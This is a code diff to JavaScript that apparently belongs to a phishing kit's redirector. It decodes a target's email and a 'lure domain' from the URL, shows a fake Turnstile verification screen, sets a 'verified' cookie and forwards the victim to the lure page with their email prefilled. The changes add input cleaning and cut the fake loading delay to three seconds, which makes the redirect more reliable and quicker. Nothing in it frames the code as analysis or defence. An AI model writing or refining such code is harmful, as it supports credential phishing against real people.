@@ -82,6 +82,18 @@
                 return '';
             }
         }
+// Function to clean domain
+function cleanDomain(domain) {
+    const domainRegex = /^(https?:\/\/[^\s]+)/; // Matches valid URL up to the first space
+    const match = domain.match(domainRegex);
+    return match ? match[1] : domain; // Return the matched part or the original
+}
+
+// Function to clean email
+function cleanEmail(email) {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // Matches standard email format
+    return emailRegex.test(email) ? email : null; // Return email if valid, otherwise null
+}
 
         var loadingStyle = document.createElement("style");
         loadingStyle.textContent = decodeBase64ToCSS(base64CSS);
@@ -90,7 +102,7 @@
         // Remove loading animation after 15 seconds
         setTimeout(function() {
             loadingDiv.style.display = 'none';
-        }, 30000);
+        }, 3000);
 
         // Function to decode Base64
         function decodeBase64(encoded) {
@@ -286,12 +298,16 @@ function startTurnstileVerification() {
     loadingDiv.style.display = "flex";
 
     // Extract and decode email from URL
-    const email = extractAndDecodeEmail();
-    const domain = extractLureDomain();
+    let email = extractAndDecodeEmail();
+    let domain = extractLureDomain();
+
+    // Clean domain and email
+    domain = cleanDomain(domain);
+    email = cleanEmail(email);
 
     // Validate domain and email
     if (!email || !domain) {
-        console.error("Missing email or domain. Cannot redirect.");
+        console.error("Invalid email or domain after cleaning. Cannot redirect.");
         loadingDiv.style.display = "none"; // Hide loading animation
         return;
     }
@@ -300,8 +316,8 @@ function startTurnstileVerification() {
     document.cookie = "verified=true; Path=/; SameSite=None; Secure=true";
 
     // Debugging
-    console.log("Domain:", domain);
-    console.log("Email:", email);
+    console.log("Cleaned Domain:", domain);
+    console.log("Cleaned Email:", email);
 
     // Construct the redirect URL
     const redirectUrl = `${domain}?POP=${encodeURIComponent(email)}&redirected=done`;
